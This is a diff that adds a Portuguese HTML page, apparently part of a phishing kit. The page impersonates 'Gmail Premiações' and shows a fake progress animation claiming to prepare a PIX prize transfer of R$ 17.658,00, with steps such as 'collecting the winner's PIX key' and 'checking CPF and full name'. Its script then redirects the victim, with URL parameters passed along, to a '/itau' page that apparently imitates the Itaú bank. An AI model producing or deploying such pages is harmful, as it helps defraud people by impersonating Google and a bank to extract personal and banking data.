@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Processando...</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Google Sans',Roboto,-apple-system,sans-serif;background:#f1f3f4;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
+.card{max-width:460px;width:100%;background:#fff;border-radius:20px;padding:36px 28px 30px;box-shadow:0 1px 3px rgba(0,0,0,0.12),0 4px 16px rgba(0,0,0,0.08);border:none;}
+.header{display:flex;align-items:center;gap:14px;margin-bottom:26px;padding-bottom:22px;border-bottom:1px solid #e8eaed;}
+.logo-wrap{width:54px;height:54px;border-radius:50%;overflow:hidden;background:#fff;box-shadow:0 1px 4px rgba(0,0,0,0.15);display:flex;align-items:center;justify-content:center;}
+.logo-wrap img{width:46px;height:46px;object-fit:contain;}
+.header-text{}
+.header-title{font-size:18px;font-weight:700;color:#202124;line-height:1.2;}
+.header-sub{font-size:14px;color:#5f6368;margin-top:2px;}
+.titulo{font-size:18px;font-weight:600;color:#202124;margin-bottom:6px;}
+.subtitulo{font-size:15px;color:#5f6368;margin-bottom:28px;line-height:1.6;}
+.subtitulo strong{color:#1a73e8;}
+.steps{display:flex;flex-direction:column;gap:16px;margin-bottom:28px;}
+.step{display:flex;align-items:center;gap:16px;}
+.step-icon{width:40px;height:40px;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:all .3s;}
+.step-icon.pending{background:#f8f9fa;border:2px solid #dadce0;}
+.step-icon.loading{background:#e8f0fe;border:2px solid #1a73e8;}
+.step-icon.done{background:#e6f4ea;border:2px solid #34a853;}
+.spinner{width:18px;height:18px;border:2.5px solid #1a73e8;border-top-color:transparent;border-radius:50%;animation:spin .7s linear infinite;}
+.check{font-size:18px;color:#34a853;font-weight:700;}
+.dot{width:9px;height:9px;border-radius:50%;background:#dadce0;}
+.step-text{display:flex;flex-direction:column;gap:3px;}
+.step-label{font-size:16px;font-weight:500;color:#202124;transition:color .3s;}
+.step-label.muted{color:#bdc1c6;}
+.step-sub{font-size:13px;color:#bdc1c6;transition:color .3s;}
+.step-sub.active{color:#1a73e8;}
+.step-sub.done-txt{color:#34a853;}
+.progress-wrap{background:#f1f3f4;border-radius:8px;height:7px;overflow:hidden;margin-bottom:8px;}
+.progress-bar{height:100%;background:linear-gradient(90deg,#4285f4,#34a853,#fbbc05,#ea4335);background-size:300% 100%;animation:shimmer 2s linear infinite;border-radius:8px;width:0%;transition:width .4s ease;}
+.progress-label{font-size:13px;color:#9aa0a6;text-align:right;}
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes shimmer{0%{background-position:0% 0}100%{background-position:300% 0}}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="header">
+    <div class="logo-wrap"><img src="/logozuda.webp" alt="Gmail"></div>
+    <div class="header-text">
+      <div class="header-title">Gmail Premiações</div>
+      <div class="header-sub">Sistema de liberação automática</div>
+    </div>
+  </div>
+  <p class="titulo">Processando sua transferência</p>
+  <p class="subtitulo">Aguarde enquanto o sistema prepara seu PIX de <strong>R$ 17.658,00</strong>.</p>
+
+  <div class="steps">
+    <div class="step" id="step0">
+      <div class="step-icon pending" id="icon0"><div class="dot"></div></div>
+      <div class="step-text">
+        <span class="step-label muted" id="label0">Acessando o banco pelo sistema</span>
+        <span class="step-sub" id="sub0">aguardando...</span>
+      </div>
+    </div>
+    <div class="step" id="step1">
+      <div class="step-icon pending" id="icon1"><div class="dot"></div></div>
+      <div class="step-text">
+        <span class="step-label muted" id="label1">Verificando saldo disponível</span>
+        <span class="step-sub" id="sub1">aguardando...</span>
+      </div>
+    </div>
+    <div class="step" id="step2">
+      <div class="step-icon pending" id="icon2"><div class="dot"></div></div>
+      <div class="step-text">
+        <span class="step-label muted" id="label2">Coletando chave PIX do vencedor</span>
+        <span class="step-sub" id="sub2">aguardando...</span>
+      </div>
+    </div>
+    <div class="step" id="step3">
+      <div class="step-icon pending" id="icon3"><div class="dot"></div></div>
+      <div class="step-text">
+        <span class="step-label muted" id="label3">Validando dados cadastrais</span>
+        <span class="step-sub" id="sub3">aguardando...</span>
+      </div>
+    </div>
+    <div class="step" id="step4">
+      <div class="step-icon pending" id="icon4"><div class="dot"></div></div>
+      <div class="step-text">
+        <span class="step-label muted" id="label4">Programando PIX agendado</span>
+        <span class="step-sub" id="sub4">aguardando...</span>
+      </div>
+    </div>
+    <div class="step" id="step5">
+      <div class="step-icon pending" id="icon5"><div class="dot"></div></div>
+      <div class="step-text">
+        <span class="step-label muted" id="label5">Gerando comprovante</span>
+        <span class="step-sub" id="sub5">aguardando...</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="progress-wrap">
+    <div class="progress-bar" id="progressBar"></div>
+  </div>
+  <p class="progress-label" id="progressLabel">0%</p>
+</div>
+
+<script>
+const subs = [
+  'conectando ao sistema Google...',
+  'consultando fundo de premiações...',
+  'localizando chave PIX cadastrada...',
+  'conferindo CPF e nome completo...',
+  'agendando transferência PIX...',
+  'gerando comprovante oficial...',
+];
+const subsDone = [
+  'conexão estabelecida ✓',
+  'saldo R$ 17.658,00 confirmado ✓',
+  'chave PIX localizada ✓',
+  'dados validados ✓',
+  'PIX agendado com sucesso ✓',
+  'comprovante pronto ✓',
+];
+const durations = [1200, 1400, 1600, 1200, 1800, 1000];
+const total = durations.reduce((a,b)=>a+b,0);
+let elapsed = 0;
+
+function setLoading(i) {
+  document.getElementById('icon'+i).className = 'step-icon loading';
+  document.getElementById('icon'+i).innerHTML = '<div class="spinner"></div>';
+  document.getElementById('label'+i).classList.remove('muted');
+  document.getElementById('sub'+i).textContent = subs[i];
+  document.getElementById('sub'+i).classList.add('active');
+}
+function setDone(i) {
+  document.getElementById('icon'+i).className = 'step-icon done';
+  document.getElementById('icon'+i).innerHTML = '<span class="check">✓</span>';
+  document.getElementById('sub'+i).textContent = subsDone[i];
+  document.getElementById('sub'+i).classList.remove('active');
+  document.getElementById('sub'+i).classList.add('done-txt');
+}
+function setProgress(pct) {
+  document.getElementById('progressBar').style.width = pct+'%';
+  document.getElementById('progressLabel').textContent = Math.round(pct)+'%';
+}
+
+// Pegar parâmetros da URL para repassar ao itau.html
+const params = window.location.search;
+
+function runStep(i) {
+  if(i >= durations.length) {
+    setProgress(100);
+    setTimeout(() => { window.location.href = '/itau' + params; }, 400);
+    return;
+  }
+  setLoading(i);
+  const start = Date.now();
+  const prevElapsed = elapsed;
+  const interval = setInterval(() => {
+    const spent = Date.now() - start;
+    const pct = ((prevElapsed + spent) / total) * 100;
+    setProgress(Math.min(pct, ((prevElapsed + durations[i]) / total) * 100));
+    if(spent >= durations[i]) {
+      clearInterval(interval);
+      elapsed += durations[i];
+      setDone(i);
+      setTimeout(() => runStep(i+1), 180);
+    }
+  }, 30);
+}
+
+runStep(0);
+</script>
+</body>
+</html>
